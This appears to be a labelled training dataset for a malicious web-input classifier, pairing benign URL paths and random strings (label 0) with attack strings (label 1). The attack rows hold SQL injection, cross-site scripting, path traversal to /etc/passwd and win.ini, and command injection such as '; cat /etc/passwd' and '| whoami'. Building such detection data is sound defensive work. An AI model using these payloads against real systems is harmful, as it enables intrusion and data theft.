YpcpRFmh0ZoJ,0
' OR 3=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
txvrMo20eq,0
s E l E c T * f R o M a d m i n,1
QPAIkHbVJ,0
home,0
' OR '1'='1,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=4 --,1
' OR '1'='1,1
admin' --,1
' OR 9=8 --,1
onerror=alert(1),1
/about?session=56767,0
MrI2NSSVLw,0
index,0
fF5Ltp1yEWla5,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
aGYW81FH7u6,0
s E l E c T * f R o M a d m i n,1
<script>var a=348;alert(a)</script>,1
/index?session=97484,0
e2HZg1tpWWn,0
1' o r '1'='1,1
javascript:alert(1),1
qX2cHLqPUbphe9P,0
register,0
/register?id=8571,0
' OR 6=7 --,1
cart,0
/cart?id=7338,0
/user?session=87919,0
' OR 2=7 --,1
/profile?id=5738,0
/dashboard?session=94744,0
DgxV7FrSKBob,0
admin'/* bypass */OR 1=1,1
cart,0
' OR 1=5 --,1
' OR 1=1 --,1
profile,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/contact?id=6514,0
' OR 9=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=6931,0
' OR 4=1 --,1
admin' --,1
admin' --,1
home,0
contact,0
9hQPl6Av1k2a,0
Zyn1XXg8,0
<script>var a=79;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 4=1 --,1
Ynfu4WCq,0
admin' --,1
/dashboard?id=7468,0
<script>var a=597;alert(a)</script>,1
profile,0
/search?session=19332,0
s E l E c T * f R o M a d m i n,1
/login?session=74666,0
' OR 6=4 --,1
| whoami,1
<script>var a=257;alert(a)</script>,1
715SBfo7M,0
<script>alert(document.cookie)</script>,1
about,0
cart,0
; cat /etc/passwd,1
/about?session=56089,0
/search?session=44596,0
checkout,0
' OR 6=2 --,1
/dashboard?id=8760,0
/home?session=44389,0
onerror=alert(1),1
/login?id=741,0
' OR 1=1 --,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
| whoami,1
/index?session=94812,0
' OR 8=6 --,1
/blog?session=47380,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
uTpXvqNbZoFg,0
settings,0
admin'/* bypass */OR 1=1,1
/blog?id=3461,0
admin%00' OR 1=1,1
/about?session=57050,0
javascript:alert(1),1
C8x8iXZnOmm9vd,0
/register?id=4375,0
../../../../etc/passwd,1
mAx550tbP0YS7E,0
javascript:alert(1),1
; cat /etc/passwd,1
/register?id=5950,0
/register?session=30243,0
/search?id=3689,0
' OR 4=2 --,1
/search?id=8600,0
/register?id=4837,0
dashboard,0
admin' --,1
' OR 2=4 --,1
s E l E c T * f R o M a d m i n,1
B0iQS3D8T,0
' OR 9=1 --,1
| whoami,1
checkout,0
about,0
/index?id=1956,0
/index?id=548,0
home,0
<script>var a=912;alert(a)</script>,1
blog,0
j1LNo2W95PxZjKI,0
/blog?session=27743,0
<script>var a=332;alert(a)</script>,1
about,0
' OR 5=9 --,1
register,0
| whoami,1
' OR 6=9 --,1
' OR 7=6 --,1
<script>alert(document.cookie)</script>,1
i1UN4VZvz,0
home,0
onerror=alert(1),1
/login?id=8606,0
/contact?id=8939,0
; cat /etc/passwd,1
/index?id=7802,0
' OR 8=2 --,1
admin' --,1
| whoami,1
DSWaoVCcyZNRTeG,0
admin%00' OR 1=1,1
/home?session=82987,0
<script>var a=452;alert(a)</script>,1
javascript:alert(1),1
onerror=alert(1),1
settings,0
' OR 1=1 --,1
<script>var a=313;alert(a)</script>,1
../../../windows/win.ini,1
/contact?session=35778,0
/register?id=7990,0
' OR 5=9 --,1
' OR 1=1 --,1
AapFJaI5tX,0
lfVNuauZKUY,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=8281,0
1' o r '1'='1,1
/contact?session=16013,0
' OR 8=1 --,1
/index?session=98165,0
profile,0
/register?session=29320,0
/user?session=97027,0
; cat /etc/passwd,1
1' o r '1'='1,1
<script>var a=631;alert(a)</script>,1
search,0
../../../windows/win.ini,1
<script>var a=131;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?session=22192,0
/dashboard?session=17912,0
' OR 4=7 --,1
<script>var a=827;alert(a)</script>,1
/cart?session=57655,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
| whoami,1
contact,0
<script>var a=35;alert(a)</script>,1
8f9TYpjn4,0
' OR 7=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=98691,0
s E l E c T * f R o M a d m i n,1
K462N91xe7,0
admin%00' OR 1=1,1
' OR 1=1 --,1
profile,0
' OR 9=4 --,1
/checkout?session=78267,0
jUYckCWPQ9AOyex,0
admin'/* bypass */OR 1=1,1
CwHqmoj3hMUrKy,0
blog,0
' OR '1'='1,1
ZxjqDEchlm1s,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
/about?session=63955,0
; cat /etc/passwd,1
4WOPg5LH1HZzb,0
' OR '1'='1,1
/blog?id=5113,0
J31VJxXEFjw,0
PCQEVX2YiUmI,0
/dashboard?session=78033,0
javascript:alert(1),1
/checkout?id=1065,0
/contact?session=13430,0
/checkout?session=36840,0
<script>var a=709;alert(a)</script>,1
' OR 9=3 --,1
../../../windows/win.ini,1
profile,0
' OR '1'='1,1
about,0
VCvLLkSa7K0gv,0
/index?id=3752,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=877;alert(a)</script>,1
' OR 2=1 --,1
<script>var a=295;alert(a)</script>,1
1' o r '1'='1,1
profile,0
<script>var a=539;alert(a)</script>,1
' OR 9=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=11932,0
admin' --,1
dashboard,0
onerror=alert(1),1
1' o r '1'='1,1
/index?id=9555,0
onerror=alert(1),1
onerror=alert(1),1
/index?id=5962,0
| whoami,1
/profile?id=6614,0
<script>var a=691;alert(a)</script>,1
Kio1cw2sXfh5QO,0
/about?id=2716,0
onerror=alert(1),1
gqNFZWWNSknlnB6,0
admin' --,1
' OR 5=2 --,1
/cart?session=84763,0
s6NP8PB7miI,0
' OR '1'='1,1
/home?session=35442,0
idfWMQ2g,0
| whoami,1
' OR 2=9 --,1
/dashboard?session=41583,0
/login?session=86761,0
' OR 2=9 --,1
' OR 5=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
/dashboard?id=3628,0
' OR '1'='1,1
' OR 8=4 --,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
9vPLdJpNLQ,0
/register?session=48993,0
/contact?id=8290,0
/about?session=77704,0
/register?session=37568,0
<script>var a=67;alert(a)</script>,1
' OR 7=5 --,1
Ob79ZcdtbqI6,0
' OR 1=1 --,1
javascript:alert(1),1
<script>var a=640;alert(a)</script>,1
w9X1JnxEmQzsINA,0
; cat /etc/passwd,1
../../../windows/win.ini,1
../../../windows/win.ini,1
' OR 1=1 --,1
| whoami,1
settings,0
/profile?session=15667,0
/dashboard?id=8876,0
javascript:alert(1),1
/index?session=26359,0
' OR 2=7 --,1
<script>var a=296;alert(a)</script>,1
/search?session=69143,0
TzBgDrExoB,0
profile,0
cart,0
/cart?session=32972,0
RQLnck5g,0
<script>var a=742;alert(a)</script>,1
admin' --,1
<script>var a=517;alert(a)</script>,1
geUGQscl,0
/dashboard?id=974,0
; cat /etc/passwd,1
4Z16UJmnw7,0
/home?id=9759,0
' OR 2=7 --,1
' OR 9=6 --,1
register,0
/search?session=19661,0
../../../windows/win.ini,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=571;alert(a)</script>,1
IlNLmKroBNnmK,0
/about?session=43263,0
/dashboard?id=376,0
admin'/* bypass */OR 1=1,1
/home?session=19409,0
/search?session=80206,0
index,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
o2WqGQMEcw,0
; cat /etc/passwd,1
<script>var a=780;alert(a)</script>,1
/login?session=62275,0
1' o r '1'='1,1
/settings?id=5849,0
1' o r '1'='1,1
/cart?session=58350,0
<script>var a=866;alert(a)</script>,1
2hyyy1nMO1Jx,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
zIHfW1cV,0
' OR 5=4 --,1
/blog?session=38052,0
<script>var a=325;alert(a)</script>,1
javascript:alert(1),1
../../../../etc/passwd,1
/profile?id=6295,0
/checkout?session=76220,0
admin'/* bypass */OR 1=1,1
' OR 9=6 --,1
3YM2yxOQusxR1r,0
' OR 5=2 --,1
<script>var a=163;alert(a)</script>,1
admin' --,1
/index?id=8232,0
/login?id=8806,0
login,0
' OR 3=4 --,1
' OR 4=6 --,1
about,0
admin%00' OR 1=1,1
' OR 9=7 --,1
; cat /etc/passwd,1
61cBAD5dvfIxLv,0
/profile?id=3741,0
dashboard,0
dashboard,0
about,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=20;alert(a)</script>,1
<script>var a=145;alert(a)</script>,1
/home?session=10211,0
/about?id=6561,0
../../../windows/win.ini,1
5k1GnYnYiqJm,0
' OR '1'='1,1
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=43559,0
cart,0
qV5S4RP7,0
<script>var a=328;alert(a)</script>,1
' OR 3=3 --,1
/user?id=3696,0
/checkout?session=96559,0
vDkq2NdsLNjIOIq,0
; cat /etc/passwd,1
| whoami,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
/home?id=1479,0
onerror=alert(1),1
/search?session=12751,0
s E l E c T * f R o M a d m i n,1
settings,0
' OR 5=9 --,1
/profile?session=18204,0
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
onerror=alert(1),1
login,0
<script>var a=154;alert(a)</script>,1
<script>var a=39;alert(a)</script>,1
admin' --,1
../../../windows/win.ini,1
register,0
zhdYHXhFWYJJK3F,0
cart,0
<script>var a=765;alert(a)</script>,1
' OR 1=7 --,1
blog,0
<script>var a=410;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
' OR 2=1 --,1
about,0
admin'/* bypass */OR 1=1,1
/checkout?session=54049,0
dU1XOuOd8SfgrvV,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
RBRq66YmZHvsUXq,0
../../../windows/win.ini,1
/search?id=8429,0
/index?session=69725,0
profile,0
' OR 3=4 --,1
' OR 8=1 --,1
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
' OR 4=9 --,1
Sv2nXkwyem2xd7a,0
i1COYL2ZPpu,0
<script>alert(document.cookie)</script>,1
<script>var a=987;alert(a)</script>,1
/settings?id=9878,0
<script>var a=295;alert(a)</script>,1
/register?id=7462,0
../../../../etc/passwd,1
' OR 9=5 --,1
../../../../etc/passwd,1
' OR 7=1 --,1
GgObRhuh489OPu,0
' OR 8=6 --,1
../../../windows/win.ini,1
/settings?session=95821,0
' OR '1'='1,1
/login?session=47732,0
admin'/* bypass */OR 1=1,1
' OR 5=2 --,1
1xPffe7bnRZQ1vf,0
| whoami,1
/contact?session=94257,0
/user?session=27247,0
' OR 8=4 --,1
/search?id=3110,0
admin' --,1
1' o r '1'='1,1
i2WnaK9JygfcW,0
<script>var a=544;alert(a)</script>,1
s3eVctV5,0
/settings?id=3753,0
/user?id=9503,0
1' o r '1'='1,1
register,0
' OR 9=6 --,1
<script>var a=734;alert(a)</script>,1
admin' --,1
<script>var a=500;alert(a)</script>,1
0GeZqpEG,0
<script>var a=999;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
blog,0
javascript:alert(1),1
admin' --,1
<script>var a=722;alert(a)</script>,1
/login?session=89467,0
<script>var a=953;alert(a)</script>,1
/user?session=25267,0
/register?id=8565,0
' OR 4=4 --,1
' OR 5=9 --,1
search,0
/login?id=3254,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
' OR 1=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=3935,0
' OR 5=2 --,1
javascript:alert(1),1
; cat /etc/passwd,1
<script>var a=254;alert(a)</script>,1
/search?id=5248,0
about,0
5sH6cKUC4ff9,0
' OR 7=9 --,1
QkHaU8hmJwe,0
| whoami,1
1' o r '1'='1,1
rucIYFNjCv1Y,0
admin'/* bypass */OR 1=1,1
/home?session=69654,0
biTMZ8jdczzJoz8,0
<script>var a=83;alert(a)</script>,1
/checkout?session=91245,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
OklSX3XD0DcHJ54,0
' OR 5=6 --,1
search,0
/about?id=7061,0
' OR 6=1 --,1
/search?id=2790,0
' OR '1'='1,1
checkout,0
| whoami,1
<script>var a=866;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
user,0
<script>var a=912;alert(a)</script>,1
checkout,0
' OR '1'='1,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR '1'='1,1
<script>var a=735;alert(a)</script>,1
HCpXgZR6YGo,0
nZ56BvDVh51,0
/settings?id=6684,0
about,0
/cart?id=6849,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
FOE5kgDb4Z,0
40Wq26Kzb,0
' OR 1=1 --,1
/search?session=66190,0
<script>var a=351;alert(a)</script>,1
../../../windows/win.ini,1
' OR 7=5 --,1
/contact?id=3330,0
cart,0
vUFX5sPq,0
about,0
' OR 9=1 --,1
<script>var a=914;alert(a)</script>,1
index,0
search,0
1' o r '1'='1,1
' OR 6=4 --,1
<script>var a=974;alert(a)</script>,1
search,0
admin'/* bypass */OR 1=1,1
checkout,0
/register?id=3582,0
home,0
HNsihHr4,0
/user?session=36092,0
admin'/* bypass */OR 1=1,1
/about?session=20041,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=67686,0
/dashboard?id=1410,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=6 --,1
jRIyf141Vri,0
/checkout?id=5330,0
Ubkd2S1FNzIrc8j,0
cart,0
/blog?session=19169,0
' OR 5=9 --,1
/about?session=87693,0
/login?session=21914,0
7yHh7hX0d7z,0
QaBI26JSDY9e,0
/checkout?id=3977,0
home,0
' OR '1'='1,1
F78PNnEgR,0
M1vTqnIP,0
prxLAnAQuf,0
jQydoK31,0
admin%00' OR 1=1,1
<script>var a=865;alert(a)</script>,1
' OR 4=3 --,1
kjFLJzDcIgkno,0
' OR 5=4 --,1
7rfba6rcLOR92Pi,0
<script>var a=58;alert(a)</script>,1
register,0
<script>var a=789;alert(a)</script>,1
s6eW53Dx,0
onerror=alert(1),1
home,0
/search?id=4418,0
' OR 2=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
' OR 1=1 --,1
' OR 1=1 --,1
/about?session=27448,0
' OR 8=9 --,1
ndmWz4vzC7,0
register,0
/about?id=7054,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
javascript:alert(1),1
<script>var a=599;alert(a)</script>,1
u7GUlPNKnP,0
; cat /etc/passwd,1
/user?session=58404,0
<script>var a=614;alert(a)</script>,1
/search?session=45163,0
/register?id=7642,0
8gTHJKma57E,0
' OR 9=8 --,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=1460,0
admin' --,1
/about?session=13603,0
/profile?session=13335,0
/login?session=88866,0
1Q5U5iSYqI3dMQ,0
/search?session=36153,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
RH2m4qMANr87oMe,0
' OR 7=4 --,1
/index?id=2519,0
javascript:alert(1),1
' OR 9=5 --,1
<script>var a=756;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=477;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=313;alert(a)</script>,1
search,0
' OR 7=2 --,1
j6CJnGiujWTiJ,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=391;alert(a)</script>,1
/user?session=17969,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=556;alert(a)</script>,1
/login?session=94436,0
' OR 1=1 --,1
| whoami,1
../../../../etc/passwd,1
/blog?session=67086,0
/profile?id=9007,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
1' o r '1'='1,1
SKumG6H6,0
/index?session=30413,0
' OR 9=5 --,1
; cat /etc/passwd,1
/blog?session=84715,0
' OR '1'='1,1
<script>var a=465;alert(a)</script>,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
/search?session=50944,0
' OR 9=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=92831,0
/about?session=32920,0
oZJceN3kjXTc,0
/cart?id=9368,0
/settings?session=77416,0
/settings?session=77240,0
1' o r '1'='1,1
<script>var a=948;alert(a)</script>,1
; cat /etc/passwd,1
; cat /etc/passwd,1
about,0
HyXWgtldNKXCH6R,0
../../../windows/win.ini,1
' OR 1=1 --,1
/user?session=47915,0
' OR 1=1 --,1
wa0GcSYMVJcc,0
o6frGl0SLV,0
onerror=alert(1),1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
/settings?session=33669,0
PoaVWcZR8,0
; cat /etc/passwd,1
/index?session=29716,0
hF7QSmVDt1sa,0
admin' --,1
QnetbRFBBi77pT,0
<script>var a=366;alert(a)</script>,1
czXKb63V,0
s E l E c T * f R o M a d m i n,1
jLypPxMqRNeU,0
/dashboard?id=4900,0
<script>alert(document.cookie)</script>,1
' OR 3=9 --,1
9hxiwign3956Z,0
1' o r '1'='1,1
<script>var a=857;alert(a)</script>,1
/contact?session=20269,0
' OR 1=9 --,1
/profile?id=5446,0
zcgPxRp2lm,0
user,0
' OR '1'='1,1
' OR 9=6 --,1
8uRUY4Jh46kVfp,0
<script>var a=790;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=76682,0
../../../../etc/passwd,1
../../../windows/win.ini,1
login,0
1' o r '1'='1,1
blog,0
' OR 1=1 --,1
Yp78cnI44Tb3,0
3thJ8CkPyFm,0
/about?session=51139,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
MwWFH5F48Ki8VR,0
../../../windows/win.ini,1
' OR 9=6 --,1
<script>var a=404;alert(a)</script>,1
1' o r '1'='1,1
ZnDF1u4jpff,0
' OR 3=8 --,1
' OR 3=5 --,1
/dashboard?session=92553,0
s E l E c T * f R o M a d m i n,1
/settings?session=29739,0
/user?id=3630,0
/login?session=80858,0
login,0
TaRuc8ozx,0
/checkout?id=7025,0
<script>alert(document.cookie)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
/register?session=59634,0
| whoami,1
/register?id=2895,0
cart,0
kDfGv4BFHTrXJ,0
admin%00' OR 1=1,1
sTLsj4JKadLG9f,0
<script>var a=550;alert(a)</script>,1
' OR 7=7 --,1
/settings?session=49573,0
' OR 6=4 --,1
' OR 1=1 --,1
fyUKKmo5I17Nxpr,0
blog,0
/login?id=4356,0
blog,0
/login?id=8326,0
/contact?session=85687,0
/login?session=48512,0
N7Pcv6SdxT3,0
<script>var a=846;alert(a)</script>,1
| whoami,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=28544,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR '1'='1,1
3WdIYsQjx0Z4cS,0
MJEn5GHeybDO,0
onerror=alert(1),1
/contact?session=67013,0
/about?id=6739,0
| whoami,1
<script>var a=472;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 9=8 --,1
heCrqIS3c5,0
dashboard,0
enPRPFy2RwE7per,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=84692,0
<script>var a=851;alert(a)</script>,1
/register?id=2434,0
search,0
<script>var a=921;alert(a)</script>,1
<script>var a=479;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 2=1 --,1
' OR 6=3 --,1
/settings?session=87047,0
/login?session=69862,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=327;alert(a)</script>,1
/about?id=6536,0
user,0
RGeU1zR4Gw,0
VMDlA9sS6G6ji,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=951;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=4416,0
/checkout?id=6591,0
onerror=alert(1),1
<script>var a=858;alert(a)</script>,1
/contact?id=2482,0
../../../../etc/passwd,1
javascript:alert(1),1
/profile?session=88646,0
/checkout?session=50315,0
<script>var a=665;alert(a)</script>,1
1' o r '1'='1,1
/blog?session=73395,0
heFXUAHzE507xR,0
register,0
../../../../etc/passwd,1
admin' --,1
about,0
admin%00' OR 1=1,1
user,0
<script>alert(document.cookie)</script>,1
/search?session=21382,0
' OR 2=9 --,1
fmBphDATvkp77f,0
search,0
<script>var a=547;alert(a)</script>,1
/register?id=5492,0
/cart?session=68892,0
contact,0
javascript:alert(1),1
../../../windows/win.ini,1
/home?id=9941,0
/cart?session=12589,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/user?id=544,0
<script>var a=967;alert(a)</script>,1
' OR 4=8 --,1
/settings?session=25846,0
' OR 6=5 --,1
checkout,0
register,0
<script>var a=744;alert(a)</script>,1
UTuKWkwM,0
/search?session=30780,0
/cart?id=1088,0
onerror=alert(1),1
/about?id=1842,0
1' o r '1'='1,1
i1TaAJDRa,0
/home?id=9462,0
<script>alert(document.cookie)</script>,1
<script>var a=756;alert(a)</script>,1
/index?session=33915,0
/checkout?id=6756,0
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/settings?session=58227,0
' OR '1'='1,1
' OR 9=8 --,1
zjwgnGcQZY,0
cart,0
onerror=alert(1),1
../../../../etc/passwd,1
' OR '1'='1,1
Q4mIICLb,0
../../../../etc/passwd,1
/settings?id=2210,0
' OR 5=4 --,1
admin'/* bypass */OR 1=1,1
/settings?session=76721,0
login,0
B3ak906qvkmXMr,0
/settings?session=17295,0
<script>var a=161;alert(a)</script>,1
' OR 3=7 --,1
' OR 4=1 --,1
<script>var a=179;alert(a)</script>,1
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
<script>var a=648;alert(a)</script>,1
/about?id=9315,0
' OR 4=7 --,1
admin' --,1
about,0
MOMnHBPo2LTr,0
/cart?session=10781,0
/contact?session=18267,0
' OR 1=2 --,1
/home?session=78841,0
../../../../etc/passwd,1
/cart?session=54142,0
index,0
index,0
admin' --,1
' OR 5=8 --,1
; cat /etc/passwd,1
/about?session=84720,0
/checkout?id=1583,0
onerror=alert(1),1
aDvjZBMB4RW3R6F,0
settings,0
' OR 4=8 --,1
admin'/* bypass */OR 1=1,1
/index?id=496,0
YMAq5K5Kwn,0
dashboard,0
<script>var a=873;alert(a)</script>,1
1' o r '1'='1,1
oPnDRgZUFb,0
' OR 3=3 --,1
/cart?id=4408,0
<script>var a=66;alert(a)</script>,1
MesicrlY4s7,0
/login?session=38325,0
/login?id=5847,0
/cart?session=57911,0
' OR 8=6 --,1
/contact?session=25676,0
/register?session=14194,0
profile,0
/settings?session=27187,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=6359,0
home,0
| whoami,1
blog,0
' OR 4=7 --,1
' OR 7=4 --,1
jnVtt0xLtKsQK4,0
/home?id=6516,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
| whoami,1
' OR '1'='1,1
../../../../etc/passwd,1
register,0
<script>var a=912;alert(a)</script>,1
checkout,0
<script>var a=861;alert(a)</script>,1
GO0tIlNhj,0
' OR 6=4 --,1
blog,0
; cat /etc/passwd,1
NGOe2k0FjCuPTN,0
/home?session=31815,0
<script>var a=849;alert(a)</script>,1
/about?id=2003,0
register,0
dashboard,0
/search?session=48845,0
dashboard,0
/cart?session=66873,0
' OR 1=3 --,1
<script>var a=991;alert(a)</script>,1
' OR 1=1 --,1
; cat /etc/passwd,1
<script>var a=471;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=328;alert(a)</script>,1
/dashboard?session=29406,0
/cart?session=69905,0
' OR 4=7 --,1
/about?session=34880,0
zCaf4VcmhdoO,0
<script>var a=753;alert(a)</script>,1
../../../../etc/passwd,1
' OR 3=3 --,1
<script>var a=129;alert(a)</script>,1
<script>var a=297;alert(a)</script>,1
eAC2DDNMqtq,0
/home?session=70607,0
<script>var a=934;alert(a)</script>,1
| whoami,1
' OR 5=3 --,1
oVEapqNnsQlI0,0
/settings?session=95477,0
s E l E c T * f R o M a d m i n,1
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=5 --,1
<script>var a=229;alert(a)</script>,1
<script>var a=949;alert(a)</script>,1
<script>var a=268;alert(a)</script>,1
<script>var a=89;alert(a)</script>,1
onerror=alert(1),1
c7jue9jStANQ,0
/profile?session=69108,0
YApiAiLGf,0
/index?id=4525,0
' OR 7=6 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
0JDPPL4XFQb0,0
' OR '1'='1,1
' OR 2=5 --,1
ghWV9irmkzLJ,0
onerror=alert(1),1
/user?id=4551,0
' OR 1=1 --,1
/checkout?session=56985,0
admin'/* bypass */OR 1=1,1
/search?id=6569,0
blog,0
CYnayHF189,0
register,0
home,0
/user?session=74988,0
search,0
search,0
' OR 7=3 --,1
/checkout?session=18924,0
/index?session=96600,0
login,0
../../../windows/win.ini,1
<script>var a=861;alert(a)</script>,1
/contact?id=413,0
/register?id=5823,0
/blog?session=35028,0
register,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=798;alert(a)</script>,1
/login?session=98346,0
' OR 1=1 --,1
' OR '1'='1,1
admin%00' OR 1=1,1
HIAq2OVA,0
' OR 7=5 --,1
/profile?session=15591,0
admin' --,1
about,0
' OR '1'='1,1
XtkfA7F1MYVIu2,0
admin'/* bypass */OR 1=1,1
/dashboard?session=32121,0
/blog?session=48331,0
' OR '1'='1,1
../../../../etc/passwd,1
/index?session=74477,0
../../../../etc/passwd,1
/cart?session=87872,0
<script>var a=303;alert(a)</script>,1
/login?id=178,0
' OR 2=2 --,1
about,0
/contact?session=46123,0
mDKQVgDAq1tW11f,0
settings,0
NoIUGXQFfax2,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=89132,0
BJOKgIxkcipF8,0
/contact?session=80465,0
/settings?id=3688,0
javascript:alert(1),1
settings,0
admin'/* bypass */OR 1=1,1
U5ejIG3GF,0
settings,0
/profile?session=91661,0
/settings?session=64927,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/profile?session=56265,0
<script>var a=800;alert(a)</script>,1
/about?id=9446,0
/register?id=4872,0
/home?session=29406,0
admin' --,1
s E l E c T * f R o M a d m i n,1
/dashboard?session=91124,0
<script>var a=387;alert(a)</script>,1
<script>var a=647;alert(a)</script>,1
' OR 4=8 --,1
/index?id=2571,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=3832,0
admin' --,1
dashboard,0
y9nUTPBvq,0
4juT9lGccA,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
user,0
y22ngVouTOlwMbm,0
onerror=alert(1),1
<script>var a=254;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
RJ8oFPeQGBWhZ,0
' OR 6=6 --,1
s E l E c T * f R o M a d m i n,1
' OR 1=3 --,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=1 --,1
CrCZzVu1cNYZF,0
/home?id=1152,0
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
xdsQ4morHM3D,0
1' o r '1'='1,1
/register?session=44385,0
nHf5NgKvs8,0
checkout,0
' OR 1=1 --,1
' OR 2=7 --,1
Zvz83USLfiYG,0
javascript:alert(1),1
' OR 1=1 --,1
/blog?id=6908,0
settings,0
home,0
index,0
/settings?session=96986,0
<script>alert(document.cookie)</script>,1
/index?id=309,0
cart,0
sOQL2JqHFbjwdp,0
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
javascript:alert(1),1
../../../windows/win.ini,1
/dashboard?id=5839,0
UNHVePJUgOFgC1,0
admin' --,1
/contact?session=12796,0
' OR '1'='1,1
/cart?session=60989,0
admin' --,1
home,0
Nk8YcJRu,0
GdN4YHad,0
admin%00' OR 1=1,1
/register?id=2778,0
/blog?id=7887,0
settings,0
/login?id=6384,0
contact,0
' OR '1'='1,1
<script>var a=587;alert(a)</script>,1
9XRIkA5BU6p,0
profile,0
TwpuWcwSNjq6qrQ,0
/blog?session=82075,0
' OR 2=9 --,1
